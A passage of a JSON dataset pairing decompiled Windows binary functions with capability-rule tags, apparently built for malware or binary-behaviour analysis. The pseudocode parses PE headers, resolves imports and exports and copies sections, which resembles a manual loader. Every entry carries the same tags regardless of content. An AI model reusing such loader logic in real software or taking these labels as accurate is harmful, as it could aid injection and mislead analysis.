            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005b390(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_91h;\n    uint var_45h;\n    uint var_41h;\n    uint var_3dh;\n    uint var_39h;\n    uint var_35h;\n    \n    var_a8h = 0;\n    var_a4h = 0;\n    fcn.00078bfa(&var_a0h, 0, 0x9f);\n    if (arg_ch == 0) {\n        uVar1 = 0x21590066;\n    }\n    else {\n        var_45h = 0;\n        var_41h = arg_10h;\n        var_3dh = 0;\n        var_39h = arg_14h;\n        var_35h = 0;\n        var_a8h = arg_ch;\n        var_a4h = 0;\n        var_91h = arg_8h;\n        uVar1 = fcn.0005b4c0(&var_a8h);\n    }\n    return uVar1;\n}\n",
        "token_count": 283
    },
    "0005b420": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005b420(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_91h;\n    uint var_45h;\n    int32_t var_41h;\n    uint var_3dh;\n    uint var_39h;\n    \n    var_a8h = 0;\n    var_a4h = 0;\n    fcn.00078bfa(&var_a0h, 0, 0x9f);\n    if (arg_ch == 0) {\n        uVar1 = 0x21590066;\n    }\n    else if (arg_10h == 0) {\n        uVar1 = 0x21590067;\n    }\n    else {\n        var_45h = 1;\n        var_41h = arg_10h;\n        var_3dh = 0;\n        var_39h = arg_14h;\n        var_a8h = arg_ch;\n        var_a4h = 0;\n        var_91h = arg_8h;\n        uVar1 = fcn.0005b4c0(&var_a8h);\n    }\n    return uVar1;\n}\n",
        "token_count": 298
    },
    "0005b4c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005b4c0(code **arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if ((*(arg_8h + 0x17) == 0) ||\n       ((iVar1 = fcn.00059530(*(arg_8h + 0x17), 0x8005573c, arg_8h + 0xf),  iVar1 == 0 &&\n        (((*(arg_8h + 99) == 0 || (*(arg_8h + 0x6f) != 0)) ||\n         (iVar1 = fcn.0005d070(*(arg_8h + 0x17), *(arg_8h + 0xf), 0x80055764, arg_8h + 0x9f),  iVar1 == 0)))))) {\n        if (*(arg_8h + 0x17) == 0) {\n            if (*(arg_8h + 99) == 0) {\n                iVar1 = (**arg_8h)(*(arg_8h + 0x67), *(arg_8h + 0x6f));\n            }\n            else {\n                iVar1 = (**arg_8h)(*(arg_8h + 0x67), *(arg_8h + 0x6f), 0);\n                iVar1 = (iVar1 != 0) - 1;\n            }\n        }\n        else {\n            iVar1 = fcn.0005b5b0(arg_8h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 353
    },
    "0005b5b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005b5b0(int32_t arg_8h)\n\n{\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    char var_dh;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_18h = fcn.0005a7d0(&var_14h, 0x47a, *(arg_8h + 0x17));\n    if ((var_18h == 0) && (var_18h = fcn.0005a540(var_14h, &var_dh),  var_18h == 0)) {\n        *(arg_8h + 0xc) = var_dh;\n        *(arg_8h + 0x1b) = var_14h;\n        *(arg_8h + 0x1f) = 0;\n        *(arg_8h + 0x2b) = 1;\n        if (var_dh == '\\0') {\n            var_18h = 0x21590064;\n        }\n        else {\n            var_4h = 0x800caa98;\n            var_8h = 0x24c;\n            var_18h = fcn.0005a6c0(var_14h, &var_ch, &var_8h);\n            if ((var_18h == 0) && (var_18h = fcn.0005a680(var_14h, var_ch, 0, var_4h, 0xfe),  var_18h == 0)) {\n                *(arg_8h + 0x23) = var_ch;\n                *(arg_8h + 0x27) = 0;\n                var_18h = fcn.0005b300(arg_8h);\n                if ((var_18h == 0) &&\n                   (var_18h = fcn.0005a680(var_14h, var_ch + 0x1a5, (0xffffff01 < var_ch) + (0xffffff58 < var_ch + 0xfe)\n                                           , arg_8h, 0xa7),  var_18h == 0)) {\n                    *(arg_8h + 0x33) = var_ch + 0x1a5;\n                    *(arg_8h + 0x37) = 0;\n                    var_18h = fcn.0005b370(arg_8h);\n                }\n            }\n        }\n    }\n    if ((var_ch != 0) && (*(arg_8h + 0x2b) != 0)) {\n        var_8h = 0;\n        fcn.00078ba0(var_14h, &var_ch, &var_8h, 0x8000);\n    }\n    fcn.000789b4(var_14h);\n    return var_18h;\n}\n",
        "token_count": 660
    },
    "0005b790": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x0005b8b0\n\nuint __cdecl fcn.0005b790(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_2ch;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_4h;\n    \n    iVar3 = arg_8h + *(arg_8h + 0x3c);\n    if (*(iVar3 + 0x18) == 0x10b) {\n        var_24h = *(iVar3 + 0xa0);\n        iVar1 = *(iVar3 + 0x34);\n        var_ch = *(iVar3 + 0x70);\n    }\n    else {\n        var_24h = *(iVar3 + 0xb0);\n        iVar1 = *(iVar3 + 0x30);\n        var_ch = *(iVar3 + 0x80);\n    }\n    if (arg_ch == iVar1) {\n        uVar2 = 0;\n    }\n    else if (var_24h == 0) {\n        if ((var_ch & 1) == 0) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = 0xffffffff;\n        }\n    }\n    else {\n        for (; var_2ch = arg_8h + var_24h,  *(var_2ch + 4) != 0; var_24h = var_24h + *(var_2ch + 4)) {\n            if ((*(var_2ch + 4) - 8U >> 1 & 0xffff) != 0) {\n                if (10 < *(var_24h + 8 + arg_8h) >> 0xc) {\n                    return 0x21590064;\n                }\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 520
    },
    "0005b9a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n\nint32_t __cdecl fcn.0005b9a0(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t arg_14h;\n    int32_t iVar3;\n    int32_t arg_14h_00;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t *var_ch;\n    uint32_t *var_8h;\n    int32_t var_4h;\n    \n    var_14h = 0;\n    var_20h = 0;\n    var_2ch = 0;\n    var_4h = 0;\n    var_28h = 0;\n    arg_14h = fcn.000356c0(0x148);\n    if (arg_14h == 0) {\n        var_34h = 0x21590004;\n    }\n    else {\n        arg_14h_00 = arg_14h + 0x40;\n        var_34h = fcn.0005a7d0(&var_2ch, 0x10, arg_8h);\n        if (var_34h == 0) {\n            var_18h = arg_ch + arg_ch[0xf];\n            if (*(var_18h + 0x18) == 0x10b) {\n                var_14h = var_18h;\n            }\n            if (*(var_18h + 0x18) != 0x10b) {\n                return 0x21590001;\n            }\n            if (var_14h == 0) {\n                iVar3 = *(var_18h + 0x80);\n                var_48h = 0;\n            }\n            else {\n                iVar3 = *(var_18h + 0x80);\n                var_48h = 0x80000000;\n            }\n            var_ch = arg_ch + iVar3;\n            if (var_ch == arg_ch) {\n                var_34h = 0;\n            }\n            else {\n                for (; var_ch[3] != 0; var_ch = var_ch + 5) {\n                    iVar3 = fcn.00057d40(&var_28h, var_4h << 2, var_4h * 4 + 4);\n                    if (iVar3 != 0) {\n                        var_34h = 0x21590004;\n                        goto code_r0x0005bd51;\n                    }\n                    if (arg_8h == 0) {\n                        var_34h = fcn.00034f40(arg_ch + var_ch[3], var_28h + var_4h * 4);\n                    }\n                    else {\n                        var_34h = fcn.0005d780(arg_8h, arg_ch + var_ch[3], var_28h + var_4h * 4);\n                    }\n                    if (var_34h != 0) goto code_r0x0005bd51;\n                    var_4h = var_4h + 1;\n                    var_34h = fcn.0005a640(var_2ch, *(var_28h + -4 + var_4h * 4), 0, arg_14h, 0x40);\n                    if (var_34h != 0) goto code_r0x0005bd51;\n                    uVar1 = *(var_28h + -4 + var_4h * 4);\n                    uVar2 = *(arg_14h + 0x3c);\n                    var_34h = fcn.0005a640(var_2ch, uVar1 + uVar2, (uVar2 >> 0x1f) + CARRY4(uVar1, uVar2), arg_14h_00, \n                                           0xf8);\n                    if (var_34h != 0) goto code_r0x0005bd51;\n                    if (*(arg_14h + 0x58) != 0x10b) {\n                        uVar1 = *(var_28h + -4 + var_4h * 4);\n                        uVar2 = *(arg_14h + 0x3c);\n                        var_34h = fcn.0005a640(var_2ch, uVar1 + uVar2, (uVar2 >> 0x1f) + CARRY4(uVar1, uVar2), \n                                               arg_14h_00, 0x108);\n                        if (var_34h != 0) goto code_r0x0005bd51;\n                    }\n                    var_38h = arg_ch + var_ch[4];\n                    if (*var_ch == 0) {\n                        iVar3 = var_ch[4];\n                    }\n                    else {\n                        iVar3 = *var_ch;\n                    }\n                    var_8h = arg_ch + iVar3;\n                    if (var_14h == 0) {\n                        var_24h = *var_8h;\n                    }\n                    else {\n                        var_24h = *var_8h;\n                    }\n                    while (var_24h != 0) {\n                        if ((var_24h & var_48h) == 0) {\n                            var_10h = arg_ch + var_24h + 2;\n                        }\n                        else {\n                            var_10h = var_24h & 0xffff;\n                        }\n                        if (arg_8h == 0) {\n                            var_34h = fcn.0005cd70(*(var_28h + -4 + var_4h * 4), var_10h, &var_20h);\n                        }\n                        else {\n                            var_34h = fcn.0005c120(var_2ch, arg_14h_00, *(var_28h + -4 + var_4h * 4), arg_8h, \n                                                   *(var_28h + -4 + var_4h * 4), var_2ch, &var_20h, &var_1ch);\n                        }\n                        if (var_34h != 0) goto code_r0x0005bd51;\n                        if (var_14h == 0) {\n                            *var_38h = var_20h;\n                            var_24h = var_8h[1];\n                        }\n                        else {\n                            *var_38h = var_20h;\n                            var_24h = var_8h[1];\n                        }\n                        var_8h = var_8h + 1;\n                        var_38h = var_38h + 1;\n                    }\n                }\n                var_34h = 0;\n            }\n        }\ncode_r0x0005bd51:\n        fcn.0005a850(var_2ch);\n        if (((var_34h != 0) && (var_28h != 0)) && (arg_8h != 0)) {\n            for (; var_4h != 0; var_4h = var_4h + -1) {\n                fcn.0005de60(arg_8h, *(var_28h + -4 + var_4h * 4), 1);\n            }\n        }\n        fcn.000357f0(var_28h);\n        fcn.000357f0(arg_14h);\n    }\n    return var_34h;\n}\n",
        "token_count": 1801
    },
    "0005bea0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005bea0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = arg_ch + *(arg_ch + 0x3c);\n    if (*(iVar2 + 0x18) == 0x10b) {\n        var_ch = *(iVar2 + 0x38);\n        var_14h = *(iVar2 + 0x54);\n    }\n    else {\n        var_ch = *(iVar2 + 0x38);\n        var_14h = *(iVar2 + 0x54);\n    }\n    fcn.00035340(arg_8h, arg_ch, var_14h);\n    var_8h = iVar2 + 0x18 + *(iVar2 + 0x14);\n    for (var_4h = 0; var_4h < *(iVar2 + 6); var_4h = var_4h + 1) {\n        if (*(var_8h + 0x10) != 0) {\n            iVar1 = fcn.0005b750(*(var_8h + 0xc), var_ch);\n            fcn.00035340(arg_8h + iVar1, arg_ch + *(var_8h + 0x14), *(var_8h + 0x10));\n        }\n        var_8h = var_8h + 0x28;\n    }\n    return 0;\n}\n",
        "token_count": 380
    },
    "0005bf80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0005bf80(int32_t arg_8h, uint arg_ch, uint32_t *arg_10h, int32_t *arg_14h, int32_t *arg_18h, uint *arg_1ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar3 = arg_8h + *(arg_8h + 0x3c);\n    if (*(iVar3 + 0x18) == 0x10b) {\n        var_10h = *(iVar3 + 0x38);\n        var_18h = *(iVar3 + 0x54);\n    }\n    else {\n        var_10h = *(iVar3 + 0x38);\n        var_18h = *(iVar3 + 0x54);\n    }\n    var_18h = fcn.0005b750(var_18h, var_10h);\n    var_8h = iVar3 + 0x18 + *(iVar3 + 0x14);\n    var_4h = 0;\n    while( true ) {\n        if (*(iVar3 + 6) <= var_4h) {\n            return 0x21590005;\n        }\n        iVar1 = fcn.00078b88(var_8h, arg_ch, 8);\n        if (iVar1 == 0) break;\n        iVar1 = fcn.0005b750(*(var_8h + 8), var_10h);\n        var_18h = iVar1 + var_18h;\n        var_8h = var_8h + 0x28;\n        var_4h = var_4h + 1;\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = var_4h;\n    }\n    if (arg_14h != NULL) {\n        *arg_14h = var_8h;\n    }\n    if (arg_18h != NULL) {\n        *arg_18h = arg_8h + var_18h;\n    }\n    if (arg_1ch != NULL) {\n        uVar2 = fcn.0005b750(*(var_8h + 8), var_10h);\n        *arg_1ch = uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 560
    },
    "0005c0a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005c0a0(int16_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_ch != 0) && (arg_ch < 0x40)) {\n        return 0x21590065;\n    }\n    if (*arg_8h == 0x5a4d) {\n        if ((arg_ch != 0) && (arg_ch < *(arg_8h + 0x1e) + 0xf8U)) {\n            return 0x21590065;\n        }\n        if (*(arg_8h + *(arg_8h + 0x1e)) == 0x4550) {\n            return 0;\n        }\n    }\n    return 0x21590065;\n}\n",
        "token_count": 184
    },
    "0005c120": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.0005c120(uint arg_8h, int32_t arg_ch, uint32_t arg_10h, uint arg_14h, uint noname_4, int32_t *arg_1ch, \n            int32_t *arg_20h, uint32_t *arg_24h)\n\n{\n    uint8_t uVar1;\n    int32_t var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    int32_t var_94h;\n    int32_t *var_90h;\n    int32_t *var_8ch;\n    uint32_t var_88h;\n    uint32_t var_84h;\n    uint var_80h;\n    uint var_78h;\n    int32_t *var_74h;\n    uint var_70h;\n    uint var_68h;\n    int32_t *var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint32_t *var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint32_t var_3ch;\n    uint32_t var_38h;\n    int32_t *var_34h;\n    uint var_30h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_34h = NULL;\n    if ((((arg_20h == NULL) || (arg_ch == 0)) || (arg_10h == 0)) || (arg_24h == NULL)) {\n        var_58h = 0x21590008;\n    }\n    else {\n        *arg_24h = arg_10h;\n        if (*(arg_ch + 0x18) == 0x10b) {\n            var_54h = arg_ch + 0x78;\n        }\n        else {\n            var_54h = arg_ch + 0x88;\n        }\n        if (*var_54h == 0) {\n            var_58h = 0x21590005;\n        }\n        else {\n            var_4ch = *var_54h + var_54h[1];\n            var_4h = arg_10h + *var_54h;\n            var_58h = fcn.0005a640(arg_8h, var_4h, 0, &var_30h, 0x28);\n            if (var_58h == 0) {\n                var_44h = arg_10h + var_14h;\n                var_50h = arg_10h + var_ch;\n                var_40h = arg_10h + var_10h;\n                var_34h = fcn.000356c0(0x104);\n                if (var_34h == NULL) {\n                    var_58h = 0x21590004;\n                }\n                else if ((arg_1ch & 0xffff0000) == 0) {\n                    var_5ch._0_2_ = arg_1ch - var_20h;\n                    if (var_1ch < var_5ch) {\n                        var_58h = 0x21590005;\n                    }\n                    else {\n                        var_58h = fcn.0005a640(arg_8h, var_44h + var_5ch * 4, 0, &var_48h, 4);\n                        if (var_58h == 0) {\n                            if ((var_48h < *var_54h) || (*var_54h + var_54h[1] <= var_48h)) {\n                                *arg_20h = arg_10h + var_48h;\n                                var_58h = 0;\n                            }\n                            else {\n                                if (var_4ch - var_48h < 0x105) {\n                                    var_60h = var_4ch - var_48h;\n                                }\n                                else {\n                                    var_60h = 0x104;\n                                }\n                                var_58h = fcn.0005a640(arg_8h, arg_10h + var_48h, CARRY4(arg_10h, var_48h), var_34h, \n                                                       var_60h);\n                                if (var_58h == 0) {\n                                    var_58h = fcn.0005c6c0(arg_14h, arg_10h, var_34h, arg_20h, arg_24h);\n                                }\n                            }\n                        }\n                    }\n                }\n                else {\n                    var_64h = arg_1ch;\n                    do {\n                        uVar1 = *var_64h;\n                        var_64h = var_64h + 1;\n                    } while (uVar1 != 0);\n                    if (var_64h - (arg_1ch + 1) < 0x103) {\n                        var_74h = arg_1ch;\n                        do {\n                            uVar1 = *var_74h;\n                            var_74h = var_74h + 1;\n                        } while (uVar1 != 0);\n                        var_84h = var_74h - (arg_1ch + 1);\n                    }\n                    else {\n                        var_84h = 0x103;\n                    }\n                    var_8h = var_84h;\n                    var_58h = -1;\n                    for (var_3ch = 0; var_3ch < var_18h; var_3ch = var_3ch + 1) {\n                        var_58h = fcn.0005a640(arg_8h, var_50h + var_3ch * 2, 0, &var_5ch, 2);\n                        if (((var_58h != 0) ||\n                            (var_58h = fcn.0005a640(arg_8h, var_44h + var_5ch * 4, 0, &var_48h, 4),  var_58h != 0)) ||\n                           (var_58h = fcn.0005a640(arg_8h, var_40h + var_3ch * 4, 0, &var_38h, 4),  var_58h != 0))\n                        goto code_r0x0005c69c;\n                        if (var_8h < var_4ch - var_38h) {\n                            var_58h = fcn.0005a640(arg_8h, arg_10h + var_38h, CARRY4(arg_10h, var_38h), var_34h, \n                                                   var_8h + 1);\n                            if (var_58h != 0) goto code_r0x0005c69c;\n                            if (*(var_34h + var_8h) == 0) {\n                                var_8ch = arg_1ch;\n                                var_90h = var_34h;\n                                for (var_88h = var_8h; 3 < var_88h; var_88h = var_88h - 4) {\n                                    if (*var_90h != *var_8ch) goto code_r0x0005c4cf;\n                                    var_8ch = var_8ch + 1;\n                                    var_90h = var_90h + 1;\n                                }\n                                if (var_88h == 0) {\ncode_r0x0005c5a5:\n                                    var_98h = 0;\n                                }\n                                else {\ncode_r0x0005c4cf:\n                                    var_94h = *var_90h - *var_8ch;\n                                    if (var_94h == 0) {\n                                        if (var_88h == 1) goto code_r0x0005c5a5;\n                                        var_94h = *(var_90h + 1) - *(var_8ch + 1);\n                                        if (var_94h == 0) {\n                                            if (var_88h == 2) goto code_r0x0005c5a5;\n                                            var_94h = *(var_90h + 2) - *(var_8ch + 2);\n                                            if (var_94h == 0) {\n                                                if ((var_88h == 3) ||\n                                                   (var_94h = *(var_90h + 3) - *(var_8ch + 3),  var_94h == 0))\n                                                goto code_r0x0005c5a5;\n                                            }\n                                        }\n                                    }\n                                    var_98h = 1;\n                                    if (var_94h < 1) {\n                                        var_98h = -1;\n                                    }\n                                }\n                                if (var_98h == 0) {\n                                    if ((var_48h < *var_54h) || (*var_54h + var_54h[1] <= var_48h)) {\n                                        *arg_20h = arg_10h + var_48h;\n                                        var_58h = 0;\n                                    }\n                                    else {\n                                        if (var_4ch - var_48h < 0x105) {\n                                            var_a0h = var_4ch - var_48h;\n                                        }\n                                        else {\n                                            var_a0h = 0x104;\n                                        }\n                                        var_58h = fcn.0005a640(arg_8h, arg_10h + var_48h, CARRY4(arg_10h, var_48h), \n                                                               var_34h, var_a0h);\n                                        if (var_58h != 0) goto code_r0x0005c69c;\n                                        var_58h = fcn.0005c6c0(arg_14h, arg_10h, var_34h, arg_20h, arg_24h);\n                                    }\n                                    break;\n                                }\n                            }\n                        }\n                    }\n                    if (var_18h <= var_3ch) {\n                        var_58h = 0x21590005;\n                    }\n                }\n            }\ncode_r0x0005c69c:\n            fcn.000357f0(var_34h);\n        }\n    }\n    return var_58h;\n}\n",
        "token_count": 2339
    },
    "0005c6c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nint32_t __cdecl fcn.0005c6c0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, int32_t *arg_18h)\n\n{\n    int32_t arg_ch_00;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = 0;\n    var_10h = 0;\n    var_ch = fcn.00078ace(arg_10h, 0x2e);\n    if (var_ch == NULL) {\n        var_14h = 0x2159000d;\n    }\n    else {\n        *var_ch = 0;\n        var_ch = var_ch + 1;\n        var_10h = fcn.000356c0(0x20a);\n        if (var_10h == 0) {\n            var_14h = 0x21590004;\n        }\n        else {\n            var_4h = 0;\n            while (var_8h = fcn.00078b8e(var_10h, arg_10h, 0x104),  var_8h != -1) {\n                *(var_10h + var_8h * 2) = 0;\n                var_14h = fcn.0005e490(arg_8h, var_10h, 0x20a, &var_4h);\n                if (((var_14h != 0) || (var_14h = fcn.0005d830(arg_8h, var_10h, &var_18h),  var_14h != 0)) ||\n                   ((var_18h != arg_ch && (var_14h = fcn.0005c820(arg_8h, var_18h, var_ch, arg_14h),  var_14h == 0))))\n                goto code_r0x0005c7f1;\n                arg_ch_00 = var_18h;\n                if (var_4h == -1) {\n                    var_14h = 0x2159000d;\n                    goto code_r0x0005c7f1;\n                }\n                var_18h = arg_8h;\n                fcn.0005de60(arg_8h, arg_ch_00, 1);\n            }\n            var_14h = 0x21590066;\ncode_r0x0005c7f1:\n            fcn.000357f0(var_10h);\n            if (var_14h == 0) {\n                *arg_18h = var_18h;\n            }\n        }\n    }\n    return var_14h;\n}\n",
        "token_count": 673
    },
    "0005c820": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0005c820(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_250h;\n    uint32_t var_214h;\n    int32_t var_210h;\n    uint var_20ch;\n    uint *var_208h;\n    uint var_204h;\n    int32_t var_200h;\n    uint var_1e8h;\n    uint var_108h;\n    \n    var_20ch = 0;\n    var_208h = &var_200h;\n    var_210h = fcn.0005a7d0(&var_20ch, 0x18, arg_8h);\n    if ((var_210h == 0) && (var_210h = fcn.0005a640(var_20ch, arg_ch, 0, &var_250h, 0x40),  var_210h == 0)) {\n        if (var_250h == 0x5a4d) {\n            var_210h = fcn.0005a640(var_20ch, arg_ch + var_214h, (var_214h >> 0x1f) + CARRY4(arg_ch, var_214h), \n                                    &var_200h, 0xf8);\n            if (var_210h == 0) {\n                if (var_200h == 0x4550) {\n                    if (var_1e8h != 0x10b) {\n                        var_210h = fcn.0005a640(var_20ch, arg_ch + var_214h, \n                                                (var_214h >> 0x1f) + CARRY4(arg_ch, var_214h), &var_108h, 0x108);\n                        if (var_210h != 0) goto code_r0x0005c996;\n                        var_208h = &var_108h;\n                    }\n                    var_210h = fcn.0005c120(var_20ch, var_208h, arg_ch, arg_8h, arg_ch, arg_10h, arg_14h, &var_204h);\n                }\n                else {\n                    var_210h = -1;\n                }\n            }\n        }\n        else {\n            var_210h = -1;\n        }\n    }\ncode_r0x0005c996:\n    fcn.0005a850(var_20ch);\n    return var_210h;\n}\n",
        "token_count": 568
    },
    "0005c9b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005c9b0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.000356c0(0x20a);\n    if (arg_ch_00 == 0) {\n        var_4h = 0x21590004;\n    }\n    else {\n        iVar1 = fcn.00078b8e(arg_ch_00, arg_ch, 0x104);\n        if (iVar1 == -1) {\n            var_4h = 0x21590066;\n        }\n        else {\n            *(arg_ch_00 + iVar1 * 2) = 0;\n            var_4h = fcn.0005ca40(arg_8h, arg_ch_00, arg_10h, arg_14h, arg_18h);\n        }\n        fcn.000357f0(arg_ch_00);\n    }\n    return var_4h;\n}\n",
        "token_count": 260
    },
    "0005ca40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
